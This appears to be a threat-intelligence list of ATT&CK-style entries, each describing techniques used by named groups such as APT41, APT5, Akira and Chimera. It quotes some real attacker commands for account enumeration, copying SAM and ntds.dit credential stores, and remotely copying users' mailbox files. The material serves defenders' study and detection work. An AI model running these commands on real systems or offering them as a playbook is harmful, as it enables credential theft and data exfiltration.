APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system.
APT38 has used a custom secure delete function to make deleted files unrecoverable.
APT38 has used Hermes ransomware to encrypt files with AES256.
APT38 has collected data from a compromised host.
APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.
APT38 has used a custom MBR wiper named BOOTWRECK to render systems inoperable.
APT38 has conducted watering holes schemes to gain initial access to victims.
APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.
APT38 have enumerated files and directories, or searched in specific locations within a compromised host.
APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.
APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.
APT38 used a Trojan called KEYLIME to capture keystrokes from the victim’s machine.
APT38  has attempted to lure victims into enabling malicious macros within email attachments.
APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.
APT38 has used the Windows API to execute code within a victim's system.
APT38 has enumerated network shares on a compromised host.
APT38 has used PowerShell to execute commands and other operational tasks.
APT38 leveraged Sysmon to understand the processes, services in the organization.
APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.
APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.
APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.
APT38 has identified security software, configurations, defensive tools, and sensors installed on a compromised system.
APT38 has created new services or modified existing ones to run executables, commands, or scripts.
APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.
APT38 has conducted spearphishing campaigns using malicious email attachments.
APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.
APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.
APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.
APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.
APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.
APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host.
APT38 has obtained and used open-source tools such as Mimikatz.
APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer.
APT38 has used VBScript to execute commands and other operational tasks.
APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.
APT38 has used web shells for persistence or to ensure redundant access.
APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine.
APT38 has installed a new Windows service to establish persistence.
APT39 has used malware to set &lt;code&gt;LoadAppInit_DLLs&lt;/code&gt; in the Registry key &lt;code&gt;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt; in order to establish persistence.
APT39 has used WinRAR and 7-Zip to compress an archive stolen data.
APT39 has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links.
APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.
APT39 has communicated with C2 through files uploaded to and downloaded from DropBox.
APT39 has used Ncrack to reveal credentials.
APT39 has used tools capable of stealing contents of the clipboard.
APT39 has used malware to turn off the &lt;code&gt;RequireSigned&lt;/code&gt; feature which ensures only signed DLLs can be run on Windows.
APT39 has utilized custom scripts to perform internal reconnaissance.
APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords.
APT39 has used remote access tools that leverage DNS in communications with C2.
APT39 has used various tools to steal files from the compromised host.
APT39 has used malware to decrypt encrypted CAB files.
APT39 has used malware to drop encrypted CAB files.
APT39 has exfiltrated stolen victim data through C2 communications.
APT39 has used SQL injection for initial compromise.
APT39 has used various tools to proxy C2 communications.
APT39 has used malware to delete files after they are deployed on a compromised host.
APT39 has used tools with the ability to search for files on a compromised host.
APT39 has downloaded tools to compromised hosts.
APT39 has utilized tools to capture mouse movements.
APT39 used custom tools to create SOCK5 and custom protocol proxies between infected hosts.
APT39 has used tools for capturing keystrokes.
APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.
APT39 has created accounts on multiple compromised hosts to perform actions within the network.
APT39 has utilized tools to aggregate data prior to exfiltration.
APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.
APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link.
APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.
APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning.
APT39 has used the post exploitation tool CrackMapExec to enumerate network shares.
APT39 has used different versions of Mimikatz to obtain credentials.
APT39 has used PowerShell to execute malicious code.
APT39 has used a command line utility and a network scanner written in python.
APT39 has used various strains of malware to query the Registry.
APT39 has maintained persistence using the startup folder.
APT39 has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.
APT39 has used NBTscan and custom tools to discover remote systems.
APT39 has used SMB for lateral movement.
APT39 used secure shell (SSH) to move laterally among their targets.
APT39 has created scheduled tasks for persistence.
APT39 has used a screen capture utility to take screenshots on a compromised host.
APT39 has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.
APT39 has modified LNK shortcuts.
APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.
APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims.
APT39 leveraged spearphishing emails with malicious links to initially compromise victims.
APT39 used Remexi to collect usernames from the system.
APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.
APT39 has used stolen credentials to compromise Outlook Web Access (OWA).
APT39 has utilized malicious VBS scripts in malware.
APT39 has used HTTP in communications with C2.
APT39 has installed ANTAK and ASPXSPY web shells.
APT41 leveraged sticky keys to establish persistence.
APT41 has added user accounts to the User and Admin groups.
APT41 created a RAR archive of targeted files for exfiltration.
APT41 used BITSAdmin to download and install payloads.
APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.
APT41 attempted to remove evidence of some of its activity by deleting Bash histories.
APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events.
APT41 cloned victim user Git repositories during intrusions.
APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.
APT41 used compiled HTML (.chm) files for targeting.
APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.
To support initial access, APT41 gained access to databases with information about existing accounts as well as plaintext and hashed passwords.
APT41 used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.
APT41 has used search order hijacking to execute malicious payloads, such as Winnti RAT.
APT41 used legitimate executables to perform DLL side-loading of their malware.
APT41 used DNS for C2 communications.
APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.
APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.
APT41 has uploaded files and data from a compromised host.
APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.
APT41 used built-in &lt;code&gt;net&lt;/code&gt; commands to enumerate domain administrator users.
APT41 has used DGAs to change their C2 servers monthly.
APT41 has configured payloads to load via LD_PRELOAD.
To support initial access, APT41 gained access to databases with information about existing accounts and lists of employees.
APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.
APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices. APT41 leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.
APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.
APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.
APT41 used the Steam community page as a fallback mechanism for C2.
APT41 deleted files from the system.
APT41 used exploit payloads that initiate download via ftp.
APT41 has executed &lt;code&gt;file /bin/pwd&lt;/code&gt; on exploited victims, perhaps to return architecture related information.
APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.
APT41 used certutil to download additional files. APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access.
APT41 used a keylogger called GEARSHIFT on a target system.
APT41 has used hashdump, Mimikatz, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.
APT41 uses remote shares to move and remotely execute payloads during lateral movemement.
APT41 used built-in &lt;code&gt;net&lt;/code&gt; commands to enumerate local administrator groups.
APT41 has created user accounts.
APT41 has created services to appear as benign system tools.
APT41 attempted to masquerade their files as popular anti-virus software.
APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.
APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.
APT41 used ntdsutil to obtain a copy of the victim environment &lt;code&gt;ntds.dit&lt;/code&gt; file.
APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets.
APT41 used the &lt;code&gt;net share&lt;/code&gt; command as part of network reconnaissance.
APT41 used VMProtected binaries in multiple intrusions.
APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes.
APT41 performed password brute-force attacks on the local admin account.
APT41 used &lt;code&gt;net group&lt;/code&gt; commands to enumerate various Windows user groups and permissions.
APT41 leveraged PowerShell to deploy malware families in victims’ environments.
APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.
APT41 used a tool called CLASSFON to covertly proxy network communications.
APT41 queried registry values to determine items such as configured RDP ports and network configurations.
APT41 created and modified startup files for persistence. APT41 added a registry key in &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&lt;/code&gt; to establish persistence for Cobalt Strike.
APT41 used RDP for lateral movement.
APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment.
APT41 deployed rootkits on Linux systems.
APT41 has used rundll32.exe to execute a loader.
APT41 has transferred implant files using Windows Admin Shares.
APT41 uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.
APT41 used a compromised account to create a scheduled task on a system.
APT41 extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the &lt;code&gt;reg save&lt;/code&gt; command or by exploiting volume shadow copies.
APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.
APT41 uses packers such as Themida to obfuscate malicious files.
APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.
APT41 uses multiple built-in commands such as &lt;code&gt;systeminfo&lt;/code&gt; and `net config Workstation` to enumerate victim system basic configuration information.
APT41 collected MAC addresses from victim machines.
APT41 has enumerated IP addresses of network resources and used the &lt;code&gt;netstat&lt;/code&gt; command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.
APT41 has executed &lt;code&gt;whoami&lt;/code&gt; commands, including using the WMIEXEC utility to execute this on remote machines.
APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.
APT41 executed &lt;code&gt;file /bin/pwd&lt;/code&gt; in activity exploiting CVE-2019-19781 against Citrix devices.
APT41 used compromised credentials to log on to other systems.
APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications.
APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.
APT41 used &lt;code&gt;cmd.exe /c&lt;/code&gt; to execute commands on remote machines.
APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.
APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.
APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.
APT41 leverages various tools and frameworks to brute-force directories on web servers.
APT5 has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.
APT5 has used the JAR/ZIP file format for exfiltrated files.
APT5 has cleared the command history on targeted ESXi servers.
APT5 has accessed Microsoft M365 cloud environments using stolen credentials.
APT5 has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence.
APT5 has made modifications to the crontab file including in `/var/cron/tabs/`.
APT5 has used legitimate account credentials to move laterally through compromised environments.
APT5 has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers.
APT5 has deleted scripts and web shells to evade detection.
APT5 has used the BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs.
APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.
APT5 has used the THINBLOOD utility to clear SSL VPN log files located at `/home/runtime/logs`.
APT5 has used malware with keylogging capabilities to monitor the communications of targeted entities.
APT5 has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. APT5 has also dumped clear text passwords and hashes from memory using Mimikatz hosted through an RDP mapped drive.
APT5 has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation.
APT5 has staged data on compromised systems prior to exfiltration often in `C:\Users\Public`.
APT5 has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs.
APT5 has named exfiltration archives to mimic Windows Updates at times using filenames with a `KB&lt;digits&gt;.zip` pattern.
APT5 has used PowerShell to accomplish tasks within targeted environments.
APT5 has used Windows-based utilities to carry out tasks including tasklist.exe.
APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality.
APT5 has moved laterally throughout victim environments using RDP.
APT5 has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers.
APT5 has copied and exfiltrated the SAM Registry hive from targeted systems.
APT5 has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs.
APT5 has modified file timestamps.
APT5 has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances.
APT5 has used cmd.exe for execution on compromised systems.
Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.
Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.
Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.
Ajax Security Team has lured victims into executing malicious files.
Ajax Security Team has used personalized spearphishing attachments.
Ajax Security Team has used various social media channels to spearphish victims.
Akira deletes administrator accounts in victim networks prior to encryption.
Akira uses utilities such as WinRAR to archive data prior to exfiltration.
Akira encrypts files in victim environments as part of ransomware operations.
Akira uses the built-in Nltest utility or tools such as AdFind to enumerate Active Directory trusts in victim environments.
Akira will exfiltrate victim data using applications such as Rclone.
Akira uses compromised VPN accounts for initial access to victim networks.
Akira engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.
Akira uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.
Akira uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.
Akira has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.
Akira uses valid account information to remotely access victim networks, such as VPN credentials.
Andariel has collected large numbers of files from compromised network systems for later extraction.
Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.
Andariel has exploited numerous ActiveX vulnerabilities, including zero-days.
Andariel has limited its watering hole attacks to specific IP address ranges.
Andariel has downloaded additional tools and malware onto compromised hosts.
Andariel has attempted to lure victims into enabling malicious macros within email attachments.
Andariel has used a variety of publicly-available remote access Trojans (RATs) for its operations.
Andariel has used &lt;code&gt;tasklist&lt;/code&gt; to enumerate processes and find a specific string.
Andariel has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.
Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments.
Andariel has hidden malicious executables within PNG files.
Andariel has used the &lt;code&gt;netstat -naop tcp&lt;/code&gt; command to display TCP connections on a victim's machine.
Aoqin Dragon has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.
Aoqin Dragon has run scripts to identify file formats including Microsoft Word.
Aoqin Dragon has spread malware in target networks by copying modules to folders masquerading as removable devices.
Aoqin Dragon has lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads.
Aoqin Dragon has used custom malware, including Mongall and Heyoka Backdoor, in their operations.
Aoqin Dragon has used fake icons including antivirus and external drives to disguise malicious payloads.
Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.
Aoqin Dragon has used the Themida packer to obfuscate malicious payloads.
Aoqin Dragon obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations.
Aquatic Panda has used WinRAR to compress memory dumps prior to exfiltration.
Aquatic Panda has encoded PowerShell commands in Base64.
Aquatic Panda has used DLL search-order hijacking to load `exe`, `dll`, and `dat` files into memory.
Aquatic Panda has attempted to stop endpoint detection and response (EDR) tools on compromised systems.
Aquatic Panda has deleted malicious executables from compromised machines.
Aquatic Panda has downloaded additional malware onto compromised hosts.
Aquatic Panda has attempted to harvest credentials through LSASS memory dumping.
Aquatic Panda has acquired and used njRAT in its operations.
Aquatic Panda has downloaded additional scripts and executed Base64 encoded commands in PowerShell.
Aquatic Panda has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems.
Aquatic Panda has used native OS commands to understand privilege levels and system details.
Aquatic Panda has attempted to discover services for third party EDR products.
Aquatic Panda has acquired and used Cobalt Strike in its operations.
Aquatic Panda has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).
Aquatic Panda has attempted and failed to run Bash commands on a Windows host by passing them to &lt;code&gt;cmd /C&lt;/code&gt;.
Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.
Axiom has compressed and encrypted data prior to exfiltration.
Axiom has used large groups of compromised machines for use as proxy nodes.
Axiom has acquired dynamic DNS services for use in the targeting of intended victims.
Axiom has collected data from a compromised network.
Axiom has used watering hole attacks to gain access.
Axiom has been observed using SQL injection to gain access to systems.
Axiom has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.
Axiom has been known to dump credentials.
Axiom has used spear phishing to initially compromise victims.
Axiom has targeted victims with remote administration tools including RDP.
Axiom has used RDP during operations.
Axiom has used steganography to hide its C2 communications.
Axiom has used digital certificates to deliver malware.
Axiom has used previously compromised administrative accounts to escalate privileges.
Axiom has used VPS hosting providers in targeting of intended victims.
BITTER has registered a variety of domains to host malicious payloads and for C2.
BITTER has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads.
BITTER has used DDNS for C2 communications.
BITTER has encrypted their C2 communications.
BITTER has used a RAR SFX dropper to deliver malware.
BITTER has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.
BITTER has exploited CVE-2021-1732 for privilege escalation.
BITTER has downloaded additional malware and tools onto a compromised host.
BITTER has attempted to lure victims into opening malicious attachments delivered via spearphishing.
BITTER has disguised malware as a Windows Security update service.
BITTER has used TCP for C2 communications.
BITTER has used scheduled tasks for persistence and execution.
BITTER has sent spearphishing emails with a malicious RTF document or Excel spreadsheet.
BITTER has obtained tools such as PuTTY for use in their operations.
BITTER has registered domains to stage payloads.
BITTER has used HTTP POST requests for C2.
BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration.
BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement.
BRONZE BUTLER downloader code has included "0" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.
BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.
BRONZE BUTLER has used legitimate applications to side-load malicious DLLs.
BRONZE BUTLER has exfiltrated files stolen from local systems.
BRONZE BUTLER has exfiltrated files stolen from file shares.
BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.
BRONZE BUTLER downloads encoded payloads and decodes them on the victim.
BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes.
BRONZE BUTLER has used &lt;code&gt;net user /domain&lt;/code&gt; to identify account information.
BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks.
BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.
The BRONZE BUTLER uploader or malware the uploader uses &lt;code&gt;command&lt;/code&gt; to delete the RAR archives after they have been exfiltrated.
BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.
BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).
BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping.
BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.
BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF.
BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.
BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.
BRONZE BUTLER has used PowerShell for execution.
BRONZE BUTLER has made use of Python-based remote access tools.
BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence.
BRONZE BUTLER typically use &lt;code&gt;ping&lt;/code&gt; and Net to enumerate systems.
BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware.
BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement.
BRONZE BUTLER has used a tool to capture screenshots.
BRONZE BUTLER has used tools to enumerate software installed on an infected host.
BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims.
Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server.
BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads.
BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.
BRONZE BUTLER has used TROJ_GETVERSION to discover system services.
BRONZE BUTLER has used &lt;code&gt;net time&lt;/code&gt; to check the local time on a target system.
BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share.
BRONZE BUTLER has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor.
BRONZE BUTLER has used VBS and VBE scripts for execution.
BRONZE BUTLER malware has used HTTP for C2.
BRONZE BUTLER has used batch scripts and the command-line interface for execution.
BackdoorDiplomacy has executed DLL search order hijacking.
BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.
BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers.
BackdoorDiplomacy has downloaded additional files and tools onto a compromised host.
BackdoorDiplomacy has copied files of interest to the main drive's recycle bin.
BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.
BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations.
BackdoorDiplomacy has dropped implants in folders named for legitimate software.
BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.
BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.
BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect.
BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives.
BackdoorDiplomacy has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.
BackdoorDiplomacy has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.
BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victim's system.
BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.
BlackTech has used stolen code-signing certificates for its malicious payloads.
BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.
BlackTech has used valid, stolen digital certificates for some of their malware and tools.
BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.
BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.
BlackTech has used e-mails with malicious documents to lure victims into installing malware.
BlackTech has used e-mails with malicious links to lure victims into installing malware.
BlackTech has used built-in API functions.
BlackTech has used the SNScan tool to find other potential targets on victim networks.
BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.
BlackTech has used Putty for remote access.
BlackTech has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.
BlackTech has used spearphishing e-mails with links to cloud services to deliver malware.
BlackTech has obtained and used tools such as Putty, SNScan, and PsExec for its operations.
Blue Mockingbird has used JuicyPotato to abuse the &lt;code&gt;SeImpersonate&lt;/code&gt; token privilege to escalate from web application pool accounts to NT Authority\SYSTEM.
Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.
Blue Mockingbird has obfuscated the wallet address in the payload binary.
Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.
Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory.
Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.
Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.
Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection.
Blue Mockingbird has used frp, ssf, and Venom to establish SOCKS proxy connections.
Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.
Blue Mockingbird has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.
Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems.
Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.
Blue Mockingbird has used Windows Explorer to manually copy malicious files to remote hosts over SMB.
Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts.
Blue Mockingbird has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the "wercplsupport" service.
Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information.
Blue Mockingbird has obtained and used tools such as Mimikatz.
Blue Mockingbird has used batch script files to automate execution and deployment of payloads.
Blue Mockingbird has used wmic.exe to set environment variables.
Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.
Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.
CURIUM has exfiltrated data from a compromised machine.
CURIUM has lured users into opening malicious files delivered via social media.
CURIUM has established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman.
CURIUM has used social media to deliver malicious files to victims.
Carbanak has used a VBScript named "ggldr" that uses Google Apps Script, Sheets, and Forms services for C2.
Carbanak may use netsh to add local firewall rule exceptions.
Carbanak has copied legitimate service names to use for malicious services.
Carbanak has named malware "svchost.exe," which is the name of the Windows shared service host program.
Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.
Carbanak installs VNC server software that executes through rundll32.
Carbanak has obtained and used open-source tools such as PsExec and Mimikatz.
Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.
Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges.
Chimera has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.
Chimera has used custom DLLs for continuous retrieval of data from memory.
Chimera has used &lt;code&gt;type \\&lt;hostname&gt;\c$\Users\&lt;username&gt;\Favorites\Links\Bookmarks bar\Imported From IE\*citrix*&lt;/code&gt; for bookmark discovery.
Chimera has cleared event logs on compromised hosts.
Chimera has encoded PowerShell commands.
Chimera has used credential stuffing against victim's remote services to obtain valid accounts.
Chimera has collected credentials for the target organization from previous breaches for use in brute force attacks.
Chimera has used side loading to place malicious DLLs in memory.
Chimera has used Cobalt Strike to encapsulate C2 in DNS traffic.
Chimera has collected data of interest from network shares.
Chimera has has used &lt;code&gt;net user /dom&lt;/code&gt; and &lt;code&gt;net user Administrator&lt;/code&gt; to enumerate domain accounts including administrator accounts.
Chimera has used compromised domain accounts to gain access to the target environment.
Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential.
Chimera has &lt;code&gt;nltest /domain_trusts&lt;/code&gt; to identify domain trust relationships.
Chimera has used Cobalt Strike C2 beacons for data exfiltration.
Chimera has exfiltrated stolen data to OneDrive accounts.
Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.
Chimera has performed file deletion to evade detection.
Chimera has utilized multiple commands to identify data of interest in file and directory listings.
Chimera has remotely copied tools and malware onto targeted systems.
Chimera has copied tools between compromised hosts using SMB.
Chimera has used &lt;code&gt;net user&lt;/code&gt; for account discovery.
Chimera has staged stolen data locally on compromised hosts.
Chimera has harvested data from victim's e-mail including through execution of &lt;code&gt;wmic /node:&lt;ip&gt; process call create "cmd /c copy c:\Users\&lt;username&gt;\&lt;path&gt;\backup.pst c:\windows\temp\backup.pst" copy "i:\&lt;path&gt;\&lt;username&gt;\My Documents\&lt;filename&gt;.pst"
copy&lt;/code&gt;.
Chimera has used &lt;code&gt;net localgroup administrators&lt;/code&gt; to identify  accounts with local administrative rights.
Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.
Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.
